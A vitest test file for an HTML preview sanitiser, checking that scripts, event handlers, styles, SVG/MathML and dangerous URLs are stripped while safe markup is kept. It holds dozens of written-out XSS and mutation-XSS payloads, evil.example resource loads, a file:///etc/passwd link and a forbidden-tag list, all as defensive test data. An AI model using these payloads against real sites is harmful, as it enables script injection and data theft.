/**
 * The HTML preview pipeline: what it keeps, what it removes, and that nothing an author writes
 * can run or load anything it should not. The attacks are checked on the whole output (parsed
 * again as a browser would), not only by looking for a string.
 */
import { describe, expect, it } from "vitest";
import type { RenderContext } from "../core/format";
import { renderHtml, htmlSanitiseSchema } from "./html";
import {
  HTML_NOTE_TEXT,
  HTML_PREVIEW_LIMIT,
  HTML_TOO_LARGE,
  isTooLargeForPreview,
} from "./html-limits";

const context: RenderContext = {
  path: "/docs/page.html",
  resolveAsset: (p) => `asset://doc/${p}`,
};
const render = async (text: string, ctx: RenderContext = context) =>
  (await renderHtml(text, ctx)).html;

const ALLOWED_TAGS = new Set(htmlSanitiseSchema.tagNames);
const URL_ATTRIBUTES = ["href", "src", "cite", "longdesc", "action", "formaction", "poster"];
const FORBIDDEN =
  "script,style,link,meta,base,iframe,frame,frameset,object,embed,applet,form,input,button,select,textarea,svg,math,noscript,template,head,title,video,audio,source,picture,canvas,area,map";

/** Checks a whole output after parsing it the way the preview does (in a template). */
function assertSafe(out: string): Document {
  const dom = new DOMParser().parseFromString(out, "text/html");
  const template = document.createElement("template");
  template.innerHTML = out;
  for (const root of [dom.body, template.content]) {
    expect(root.querySelectorAll(FORBIDDEN), "forbidden element").toHaveLength(0);
    for (const el of Array.from(root.querySelectorAll("*"))) {
      expect(ALLOWED_TAGS.has(el.localName), `unexpected <${el.localName}>`).toBe(true);
      for (const attr of Array.from(el.attributes)) {
        const name = attr.name.toLowerCase();
        expect(name, `${el.localName}@${name}`).not.toMatch(/^on/);
        expect(name).not.toMatch(/^(style|srcset|formaction|ping|http-equiv|target)$/);
        if (name === "class") {
          if (el.localName === "code") expect(attr.value).toMatch(/^language-\S+$/);
          else {
            expect(el.localName).toBe("p");
            expect(attr.value).toBe("html-preview-note");
          }
        }
        if (name === "id" || name === "name") expect(attr.value).toMatch(/^user-content-/);
        if (URL_ATTRIBUTES.includes(name)) {
          // Compare as a browser does: without whitespace and control characters.
          // eslint-disable-next-line no-control-regex -- stripping the control characters browsers ignore
          const value = attr.value.replace(/[\u0000- ]/g, "");
          expect(value, `${el.localName}@${name}`).not.toMatch(
            /^(javascript|vbscript|livescript):/i,
          );
          if (/^data:/i.test(value)) {
            expect(el.localName).toBe("img");
            expect(name).toBe("src");
            expect(value).toMatch(/^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/]*={0,2}$/i);
          }
          if (name === "src") expect(el.localName).toBe("img");
        }
      }
    }
  }
  return dom;
}

describe("a document becomes a preview", () => {
  it("renders the body, with the note first", async () => {
    const out = await render(
      "<!doctype html><html><head><title>Hidden title</title></head><body><h1>Hello</h1><p>Text</p></body></html>",
    );
    const dom = assertSafe(out);
    const first = dom.body.firstElementChild;
    expect(first?.className).toBe("html-preview-note");
    expect(first?.textContent).toBe(HTML_NOTE_TEXT);
    expect(dom.querySelectorAll(".html-preview-note")).toHaveLength(1);
    expect(dom.querySelector("h1")?.textContent).toBe("Hello");
    expect(out).not.toContain("Hidden title");
  });

  it("renders a fragment with no html or body tags", async () => {
    const dom = assertSafe(await render("<h2>Just a fragment</h2><p>Body</p>"));
    expect(dom.querySelector("h2")?.textContent).toBe("Just a fragment");
  });

  it("renders an empty document as the note alone", async () => {
    const dom = assertSafe(await render(""));
    expect(dom.body.children).toHaveLength(1);
  });

  it("keeps tables, lists, links, images and text-level markup", async () => {
    const dom = assertSafe(
      await render(
        `<table><caption>Cap</caption><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>
<ul><li>x</li></ul><ol><li>y</li></ol>
<p><a href="https://example.com/">link</a> <a href="mailto:a@b.c">mail</a> <em>e</em> <mark>m</mark> <abbr title="t">a</abbr></p>
<figure><img src="https://example.com/a.png" alt="alt"><figcaption>c</figcaption></figure>
<details><summary>s</summary>d</details><pre><code class="language-js">x</code></pre>`,
      ),
    );
    for (const selector of [
      "table caption",
      "th",
      "td",
      "ul li",
      "ol li",
      "a[href^='https://']",
      "a[href^='mailto:']",
      "mark",
      "figure figcaption",
      "img[alt='alt']",
      "details summary",
      "code.language-js",
    ]) {
      expect(dom.querySelector(selector), selector).not.toBeNull();
    }
  });

  it("is deterministic and reusable", async () => {
    const a = await render("<p>same</p>");
    expect(await render("<p>same</p>")).toBe(a);
  });

  it("stops when the render is aborted", async () => {
    const controller = new AbortController();
    controller.abort();
    await expect(
      render("<p>x</p>", { ...context, signal: controller.signal }),
    ).rejects.toMatchObject({
      name: "AbortError",
    });
  });
});

describe("removed with their contents", () => {
  const gone: Record<string, string> = {
    script: "<script>alert(1)</script>",
    style: "<style>p{background:url(https://evil.example/x)}</style>",
    link: '<link rel="stylesheet" href="https://evil.example/x.css">',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    "meta in body": '<p>a</p><meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    base: '<base href="https://evil.example/">',
    iframe: '<iframe src="https://evil.example/"></iframe>',
    "iframe srcdoc": '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    frameset: '<frameset><frame src="https://evil.example/"></frameset>',
    object: '<object data="https://evil.example/x.swf"></object>',
    embed: '<embed src="https://evil.example/x.swf">',
    applet: '<applet code="X.class"></applet>',
    form: '<form action="https://evil.example/"><input name="a"><button>Go</button></form>',
    select: "<select><option>one</option></select>",
    textarea: "<textarea>secret</textarea>",
    video: '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>',
    audio: '<audio src="https://evil.example/a.mp3"></audio>',
    canvas: "<canvas></canvas>",
    template: "<template><img src=x onerror=alert(1)></template>",
    noscript: "<noscript><img src=x onerror=alert(1)></noscript>",
    "image map": '<map name="m"><area href="javascript:alert(1)" shape="default"></map>',
  };
  for (const [name, source] of Object.entries(gone)) {
    it(name, async () => {
      const out = await render(`<p>before</p>${source}<p>after</p>`);
      assertSafe(out);
      expect(out).not.toMatch(/evil\.example|alert|secret|one</);
      expect(out).toContain("before");
    });
  }

  it("unwraps a form but keeps its text", async () => {
    const out = await render('<form action="x">Name: <input name="n"><label>Label</label></form>');
    assertSafe(out);
    expect(out).toContain("Name:");
    expect(out).toContain("Label");
    expect(out).not.toContain("<form");
  });
});

describe("script in every spelling", () => {
  const attacks: Record<string, string> = {
    plain: "<script>alert(1)</script>",
    upper: "<SCRIPT>alert(1)</SCRIPT>",
    mixed: "<ScRiPt>alert(1)</sCrIpT>",
    src: '<script src="https://evil.example/x.js"></script>',
    "src data": '<script src="data:text/javascript,alert(1)"></script>',
    "slash instead of space": "<script/src=https://evil.example/x.js></script>",
    "newline in tag": "<script\n>alert(1)</script\n>",
    "tab in tag": "<script\t>alert(1)</script>",
    unclosed: "<script>alert(1)",
    "unclosed tag": "<script",
    "double open": "<<script>script>alert(1)<</script>/script>",
    "nested split": "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "null byte": "<scr\u0000ipt>alert(1)</script>",
    "type module": '<script type="module">alert(1)</script>',
    "in a comment end": "<!--><script>alert(1)</script>-->",
    "after comment": "<!-- x --><script>alert(1)</script>",
    "in head": "<html><head><script>alert(1)</script></head><body></body></html>",
    "in body attribute": '<p title="<script>alert(1)</script>">x</p>',
    "in title": "<title><script>alert(1)</script></title>",
    "in textarea": "<textarea></textarea><script>alert(1)</script>",
    "in table": "<table><script>alert(1)</script><tr><td>x</td></tr></table>",
    "in select": "<select><script>alert(1)</script></select>",
    "in svg": "<svg><script>alert(1)</script></svg>",
    "in svg with xlink": '<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>',
    "in math": "<math><script>alert(1)</script></math>",
    "in foreignObject": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
    "in xmp": "<xmp><script>alert(1)</script></xmp>",
    "in noembed": "<noembed><script>alert(1)</script></noembed>",
    "in plaintext": "<plaintext><script>alert(1)</script>",
    cdata: "<![CDATA[<script>alert(1)</script>]]>",
    "cdata in svg": "<svg><![CDATA[<script>alert(1)</script>]]></svg>",
    "entity-encoded tag": "&lt;script&gt;alert(1)&lt;/script&gt;",
  };
  for (const [name, source] of Object.entries(attacks)) {
    it(name, async () => {
      const out = await render(source);
      assertSafe(out);
      // An attribute value may hold the letters, but no element is made from them.
      expect(
        new DOMParser().parseFromString(out, "text/html").querySelectorAll("script"),
      ).toHaveLength(0);
    });
  }
});

describe("event handlers and styles", () => {
  const attacks: Record<string, string> = {
    "img onerror": "<img src=x onerror=alert(1)>",
    "img onerror quoted": '<img src="x" onerror="alert(1)">',
    "img onerror upper": "<IMG SRC=x ONERROR=alert(1)>",
    "img onload": '<img src="x" onload="alert(1)">',
    "body onload": "<body onload=alert(1)>x</body>",
    "html onmouseover": "<html onmouseover=alert(1)><body>x</body></html>",
    "p onclick": '<p onclick="alert(1)">x</p>',
    "a onclick": '<a href="#" onclick="alert(1)">x</a>',
    "div onmouseover": '<div onmouseover="alert(1)">x</div>',
    "details ontoggle": "<details open ontoggle=alert(1)>x</details>",
    "autofocus onfocus": "<p tabindex=0 autofocus onfocus=alert(1)>x</p>",
    "marquee onstart": "<marquee onstart=alert(1)>x</marquee>",
    "entity in name": '<p &#111;nclick="alert(1)">x</p>',
    "newline in name": '<p on\nclick="alert(1)">x</p>',
    "style attribute": '<p style="background:url(https://evil.example/x)">x</p>',
    "style expression": '<p style="width:expression(alert(1))">x</p>',
    "style import": "<p style=\"@import 'https://evil.example/x.css'\">x</p>",
    "style behaviour": '<p style="behavior:url(x.htc)">x</p>',
    "style element": "<style>@import url(https://evil.example/x.css);</style><p>x</p>",
    "style in body": "<p>a</p><style>p{background:url(https://evil.example/x)}</style>",
    "style in svg": "<svg><style>*{background:url(https://evil.example/x)}</style></svg>",
    "class and id": '<p class="x" id="y" data-x="1" role="button">x</p>',
    xmlns: '<p xmlns:x="http://www.w3.org/1999/xhtml" x:onclick="alert(1)">x</p>',
  };
  for (const [name, source] of Object.entries(attacks)) {
    it(name, async () => {
      const out = await render(source);
      assertSafe(out);
      expect(out).not.toMatch(/alert|evil\.example|expression|behavior|@import/i);
    });
  }

  it("reads slashes in an unquoted value as part of the value, not as new attributes", async () => {
    const out = await render("<img/src=x/onerror=alert(1)>");
    assertSafe(out);
    expect(
      new DOMParser().parseFromString(out, "text/html").querySelector("img")?.attributes,
    ).toHaveLength(1);
  });

  it("removes class, style and data attributes the author wrote", async () => {
    const out = await render('<p class="x" style="color:red" data-x="1" data-line="99">x</p>');
    const p = new DOMParser().parseFromString(out, "text/html").querySelectorAll("p")[1]!;
    expect(p.getAttribute("class")).toBeNull();
    expect(p.getAttribute("style")).toBeNull();
    expect(p.getAttribute("data-x")).toBeNull();
    expect(p.getAttribute("data-line")).toBe("1");
  });

  it("does not let an author fake the preview note", async () => {
    const out = await render('<p class="html-preview-note">Fake note</p>');
    const dom = new DOMParser().parseFromString(out, "text/html");
    expect(dom.querySelectorAll(".html-preview-note")).toHaveLength(1);
  });
});

describe("URLs", () => {
  const schemes: Record<string, string> = {
    plain: "javascript:alert(1)",
    upper: "JAVASCRIPT:alert(1)",
    mixed: "JaVaScRiPt:alert(1)",
    "hex entity": "&#x6A;avascript:alert(1)",
    "hex entity no semicolon": "&#x6Aavascript:alert(1)",
    "decimal entity": "&#106;avascript:alert(1)",
    "decimal entity padded": "&#0000106avascript:alert(1)",
    "named colon": "javascript&colon;alert(1)",
    "entity colon": "javascript&#58;alert(1)",
    "entity colon hex": "javascript&#x3A;alert(1)",
    "tab inside": "java\tscript:alert(1)",
    "newline inside": "java\nscript:alert(1)",
    "tab entity": "java&#9;script:alert(1)",
    "newline entity": "java&#10;script:alert(1)",
    "leading space": "  javascript:alert(1)",
    "leading control": "\u0001javascript:alert(1)",
    "leading entity space": "&#32;javascript:alert(1)",
    "null inside": "java\u0000script:alert(1)",
    vbscript: "vbscript:msgbox(1)",
    livescript: "livescript:alert(1)",
    "data html": "data:text/html,<script>alert(1)</script>",
    "data html base64": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "data js": "data:text/javascript,alert(1)",
    "data svg": "data:image/svg+xml,<svg onload=alert(1)>",
    file: "file:///etc/passwd",
    blob: "blob:https://evil.example/uuid",
    "unknown scheme": "x-evil:alert(1)",
    "tauri scheme": "tauri://localhost/",
    "ipc scheme": "ipc://localhost/cmd",
    "asset typed by author": "asset://localhost/etc/passwd",
  };
  for (const [name, url] of Object.entries(schemes)) {
    it(`link: ${name}`, async () => {
      const out = await render(`<a href="${url}">x</a>`);
      assertSafe(out);
      const anchor = new DOMParser().parseFromString(out, "text/html").querySelector("a");
      expect(anchor?.getAttribute("href") ?? "").not.toMatch(
        /script|data:|file:|blob:|x-evil|tauri|ipc|asset/i,
      );
    });
    it(`image: ${name}`, async () => {
      const out = await render(`<img src="${url}">`);
      assertSafe(out);
      const image = new DOMParser().parseFromString(out, "text/html").querySelector("img");
      const src = image?.getAttribute("src") ?? "";
      // Either removed, or (when it is not a valid scheme at all, like `java<tab>script:`) handled
      // as a relative file name and given to the resolver. An author-written `asset:` address is
      // the one scheme the sanitiser lets through; the preview refuses to load it (`prepareFragment`).
      if (!/^asset:/i.test(url)) expect(src === "" || src.startsWith("asset://doc/")).toBe(true);
    });
  }

  it("removes dangerous URLs from every URL attribute", async () => {
    const out = await render(
      `<a href="javascript:1" ping="https://evil.example">a</a>
<blockquote cite="javascript:2">b</blockquote><q cite="javascript:3">q</q><del cite="javascript:4">d</del>
<img src="javascript:5" longdesc="javascript:6"><p action="javascript:7" formaction="javascript:8">p</p>
<img src="https://example.com/ok.png" srcset="https://evil.example/1.png 1x, https://evil.example/2.png 2x">`,
    );
    assertSafe(out);
    expect(out).not.toMatch(/javascript|srcset|evil\.example|ping/i);
    expect(out).toContain("https://example.com/ok.png");
  });

  it("removes srcset and picture sources entirely", async () => {
    const out = await render(
      `<picture><source srcset="https://evil.example/a.png 1x"><source media="(min-width:1px)" srcset="x.png"><img src="https://example.com/a.png" srcset="https://evil.example/b.png 2x"></picture>`,
    );
    assertSafe(out);
    expect(out).not.toMatch(/srcset|<source|<picture|evil\.example/i);
    expect(out).toContain("https://example.com/a.png");
  });

  it("keeps http, https, mailto, relative and fragment links", async () => {
    const out = await render(
      '<h1 id="top">T</h1><a href="http://a.example/">1</a><a href="https://a.example/">2</a><a href="mailto:a@b.c">3</a><a href="other.html">4</a><a href="../up.html#x">5</a><a href="#top">6</a>',
    );
    const hrefs = Array.from(
      new DOMParser().parseFromString(out, "text/html").querySelectorAll("a"),
    ).map((a) => a.getAttribute("href"));
    expect(hrefs).toEqual([
      "http://a.example/",
      "https://a.example/",
      "mailto:a@b.c",
      "other.html",
      "../up.html#x",
      "#user-content-top",
    ]);
  });
});

describe("data: images", () => {
  const png = "data:image/png;base64,iVBORw0KGgo=";

  it("keeps png, jpeg, gif and webp on img src", async () => {
    for (const type of ["png", "jpeg", "gif", "webp"]) {
      const url = `data:image/${type};base64,AAAA`;
      const out = await render(`<img src="${url}">`);
      expect(out, type).toContain(`src="${url}"`);
      assertSafe(out);
    }
  });

  it("removes every other data: image on img", async () => {
    for (const url of [
      "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
      "data:image/svg+xml,<svg onload=alert(1)>",
      "data:image/png,not-base64",
      "data:image/png;charset=utf-8;base64,AAAA",
      'data:image/png;base64,AAAA"onerror="alert(1)',
      "data:image/png;base64,AA AA",
      "data:image/pngx;base64,AAAA",
      "data:image/x-icon;base64,AAAA",
      "data:image/bmp;base64,AAAA",
      "data:text/html;base64,AAAA",
      "data:image/png;base64,AAAA#<script>",
      " data:image/svg+xml,x",
    ]) {
      const out = await render(`<img src='${url}'>`);
      assertSafe(out);
      const src =
        new DOMParser()
          .parseFromString(out, "text/html")
          .querySelector("img")
          ?.getAttribute("src") ?? "";
      expect(src, url).not.toMatch(/^\s*data:/i);
    }
  });

  it("does not allow data: anywhere but img src", async () => {
    const out = await render(
      `<a href="${png}">a</a><p cite="${png}">b</p><blockquote cite="${png}">c</blockquote><img longdesc="${png}" src="x"><div src="${png}">d</div>`,
    );
    assertSafe(out);
    expect(out).not.toContain("data:");
  });

  it("allows src on img only", () => {
    const withSrc = Object.entries(htmlSanitiseSchema.attributes ?? {}).filter(([, list]) =>
      (list ?? []).some((a) => a === "src" || (Array.isArray(a) && a[0] === "src")),
    );
    expect(withSrc.map(([tag]) => tag)).toEqual(["img"]);
    expect(htmlSanitiseSchema.attributes?.["*"]).not.toContain("src");
  });
});

describe("SVG and MathML are removed", () => {
  const sources: Record<string, string> = {
    svg: '<svg width="10" height="10"><circle r="5"/></svg>',
    "svg onload": "<svg onload=alert(1)></svg>",
    "svg use": '<svg><use href="https://evil.example/x.svg#a"></use></svg>',
    "svg animate":
      '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
    "svg set":
      '<svg><a xlink:href="x"><set attributeName="href" to="javascript:alert(1)"/></a></svg>',
    "svg image": '<svg><image href="https://evil.example/x.png"/></svg>',
    "svg foreignObject": "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
    "svg title breakout": "<svg><title><img src=x onerror=alert(1)></title></svg>",
    "svg desc breakout": "<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc></svg>",
    "svg style": "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "svg text": "<svg><text>visible?</text></svg>",
    math: "<math><mi>x</mi></math>",
    "math href": '<math href="javascript:alert(1)"><mtext>x</mtext></math>',
    "math maction":
      '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">x</maction></math>',
    "math mglyph": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "math annotation-xml":
      '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
    "unclosed svg": "<svg><g><path d='M0 0'/>",
    "svg then text": "<svg><text>gone</text></svg><p>kept</p>",
  };
  for (const [name, source] of Object.entries(sources)) {
    it(name, async () => {
      const out = await render(source);
      assertSafe(out);
      expect(out).not.toMatch(
        /svg|math|circle|path|animate|visible\?|gone|alert|evil\.example|<use|foreignobject/i,
      );
    });
  }

  it("keeps what follows a closed svg", async () => {
    expect(await render("<svg><text>gone</text></svg><p>kept</p>")).toContain("kept");
  });
});

describe("mutation XSS patterns", () => {
  const attacks: Record<string, string> = {
    noscript: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    "noscript closed": '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    "noscript in body":
      '<p>a</p><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript><p>b</p>',
    "style in noscript":
      "<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>",
    "style in svg in p": '<p><svg></p><style><a title="</style><img src=x onerror=alert(1)>">',
    "math style":
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    "form nesting":
      "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    title: '<title><a title="</title><img src=x onerror=alert(1)>">',
    textarea: '<textarea><a title="</textarea><img src=x onerror=alert(1)>">',
    xmp: '<xmp><a title="</xmp><img src=x onerror=alert(1)>">',
    iframe: '<iframe><a title="</iframe><img src=x onerror=alert(1)>">',
    noembed: '<noembed><a title="</noembed><img src=x onerror=alert(1)>">',
    noframes: '<noframes><a title="</noframes><img src=x onerror=alert(1)>">',
    select: '<select><template><a title="</template></select><img src=x onerror=alert(1)>">',
    template: '<template><a title="</template><img src=x onerror=alert(1)>">',
    comment: "<!--<img src=x onerror=alert(1)>-->",
    "comment end bang": "<!-- --!><img src=x onerror=alert(1)> -->",
    "comment short": "<!--><img src=x onerror=alert(1)>",
    "comment shortest": "<!---><img src=x onerror=alert(1)>",
    "conditional comment": "<!--[if IE]><img src=x onerror=alert(1)><![endif]-->",
    "bogus comment": "<!x><img src=x onerror=alert(1)>",
    "processing instruction": "<?xml version='1.0'?><img src=x onerror=alert(1)>",
    cdata: "<![CDATA[<img src=x onerror=alert(1)>]]>",
    "cdata with end": "<![CDATA[]]><img src=x onerror=alert(1)>",
    "doctype junk": '<!DOCTYPE html [<!ENTITY x "<img src=x onerror=alert(1)>">]><p>&x;</p>',
    "attribute breakout": '<p title="x"onmouseover="alert(1)">y</p>',
    "backtick attribute": "<p title=`x` onmouseover=alert(1)>y</p>",
    "unquoted attribute": "<p title=x onmouseover=alert(1)>y</p>",
    "attribute with angle brackets": '<p title="<img src=x onerror=alert(1)>">y</p>',
    "attribute closing script": '<p title="</script><script>alert(1)</script>">y</p>',
    listing: "<listing><img src=x onerror=alert(1)></listing>",
    plaintext: "<plaintext><img src=x onerror=alert(1)>",
    "table foster": "<table><img src=x onerror=alert(1)><tr><td>x</td></tr></table>",
    "table in a": "<a><table><a><img src=x onerror=alert(1)></a></table></a>",
    "nested forms": "<form><form><img src=x onerror=alert(1)></form></form>",
    "misnested formatting": "<b><p><i></b></p><img src=x onerror=alert(1)>",
    "adoption agency": "<a><b><a></b></a><img src=x onerror=alert(1)>",
    "deep nesting": "<div>".repeat(500) + "<img src=x onerror=alert(1)>",
    "unclosed attribute": '<img src="x" onerror="alert(1)',
    "unclosed tag at end": "<img src=x onerror=alert(1)",
    "lt in text": "a < b <img src=x onerror=alert(1)>",
    "encoded lt": "&lt;img src=x onerror=alert(1)&gt;",
    "double encoded": "&amp;lt;img src=x onerror=alert(1)&amp;gt;",
    "image tag alias": "<image src=x onerror=alert(1)>",
    isindex: "<isindex action=javascript:alert(1)>",
    "base in body": '<base href="javascript:alert(1)//"><a href="x">y</a>',
    "meta charset": '<meta charset="utf-7"><p>+ADw-img src=x onerror=alert(1)+AD4-</p>',
  };
  for (const [name, source] of Object.entries(attacks)) {
    it(name, async () => {
      const out = await render(source);
      const dom = assertSafe(out);
      // No element anywhere (including ones a second parse could create from attribute text).
      expect(dom.querySelectorAll("[onerror], [onload], [onclick], [onmouseover]")).toHaveLength(0);
      // The output is itself safe when rendered again.
      assertSafe(await render(out));
    });
  }
});

describe("data-line", () => {
  const lineOf = (out: string, selector: string): (string | null)[] =>
    Array.from(new DOMParser().parseFromString(out, "text/html").querySelectorAll(selector)).map(
      (e) => e.getAttribute("data-line"),
    );

  it("gives each block the 1-based line it starts on", async () => {
    const out = await render(
      "<!doctype html>\n<html>\n<head><title>t</title></head>\n<body>\n<h1>One</h1>\n\n<p>Two\nstill two</p>\n<ul>\n  <li>a</li>\n  <li>b</li>\n</ul>\n<pre>\ncode\n</pre>\n<table>\n<tr><td>x</td></tr>\n</table>\n</body>\n</html>",
    );
    expect(lineOf(out, "h1")).toEqual(["5"]);
    expect(lineOf(out, "p:not(.html-preview-note)")).toEqual(["7"]);
    expect(lineOf(out, "ul")).toEqual(["9"]);
    expect(lineOf(out, "li")).toEqual(["10", "11"]);
    expect(lineOf(out, "pre")).toEqual(["13"]);
    expect(lineOf(out, "table")).toEqual(["16"]);
    expect(lineOf(out, "tr")).toEqual(["17"]);
  });

  it("counts lines in a fragment from 1", async () => {
    const out = await render("<p>a</p>\n<p>b</p>\n\n\n<p>c</p>");
    expect(lineOf(out, "p:not(.html-preview-note)")).toEqual(["1", "2", "5"]);
  });

  it("marks nested blocks on their own lines", async () => {
    const out = await render("<div>\n<section>\n<h2>H</h2>\n</section>\n</div>");
    expect(lineOf(out, "div")).toEqual(["1"]);
    expect(lineOf(out, "section")).toEqual(["2"]);
    expect(lineOf(out, "h2")).toEqual(["3"]);
  });

  it("does not mark inline elements, the note or implied elements", async () => {
    const out = await render("<p>a <b>b</b> <a href='#'>c</a></p>");
    expect(lineOf(out, "b, a, .html-preview-note")).toEqual([null, null, null]);
  });

  it("is in non-decreasing document order, so scroll sync can use it", async () => {
    const source = Array.from({ length: 30 }, (_, i) => `<p>line ${i + 1}</p>`).join("\n");
    const lines = lineOf(await render(source), "p:not(.html-preview-note)").map(Number);
    expect(lines).toEqual(Array.from({ length: 30 }, (_, i) => i + 1));
  });

  it("ignores a data-line the author wrote", async () => {
    const out = await render('<p data-line="500">x</p>\n<div data-line="-1" dataline="7">y</div>');
    expect(lineOf(out, "p:not(.html-preview-note)")).toEqual(["1"]);
    expect(lineOf(out, "div")).toEqual(["2"]);
  });
});

describe("relative images", () => {
  it("resolves relative sources through resolveAsset, as Markdown does", async () => {
    const asked: string[] = [];
    const out = await render(
      '<img src="a.png"><img src="./img/b.png"><img src="../c.png"><img src="d%20e.png">',
      {
        path: "/docs/page.html",
        resolveAsset: (p) => {
          asked.push(p);
          return `asset://resolved/${p}`;
        },
      },
    );
    expect(asked).toEqual(["a.png", "./img/b.png", "../c.png", "d%20e.png"]);
    expect(out).toContain('src="asset://resolved/a.png"');
    expect(out).toContain('src="asset://resolved/../c.png"');
  });

  it("leaves absolute, protocol-relative, root-relative and fragment sources alone", async () => {
    const asked: string[] = [];
    const out = await render(
      '<img src="https://example.com/a.png"><img src="//example.com/b.png"><img src="/root.png"><img src="#frag">',
      { path: null, resolveAsset: (p) => (asked.push(p), p) },
    );
    expect(asked).toEqual([]);
    expect(out).toContain('src="https://example.com/a.png"');
  });

  it("does not resolve links, only images", async () => {
    const asked: string[] = [];
    await render('<a href="page2.html">x</a>', {
      path: "/docs/page.html",
      resolveAsset: (p) => (asked.push(p), p),
    });
    expect(asked).toEqual([]);
  });

  it("cannot be used to smuggle a scheme through the resolver", async () => {
    // A resolver that returned javascript: would be a bug elsewhere; the sanitiser still holds.
    const out = await render('<img src="x.png">', {
      path: "/docs/page.html",
      resolveAsset: () => "javascript:alert(1)",
    });
    expect(out).not.toContain("javascript");
  });
});

describe("size limit", () => {
  it("is five million characters and a bit", () => {
    expect(HTML_PREVIEW_LIMIT).toBe(5 * 1024 * 1024);
    expect(isTooLargeForPreview("x".repeat(HTML_PREVIEW_LIMIT))).toBe(false);
    expect(isTooLargeForPreview("x".repeat(HTML_PREVIEW_LIMIT + 1))).toBe(true);
  });

  it("shows a message instead of rendering a file over the limit", async () => {
    const out = await render(
      "<script>alert(1)</script>".repeat(Math.ceil(HTML_PREVIEW_LIMIT / 20)),
    );
    expect(out).toBe(HTML_TOO_LARGE);
    expect(out).toMatch(/too large to preview/i);
  });
});
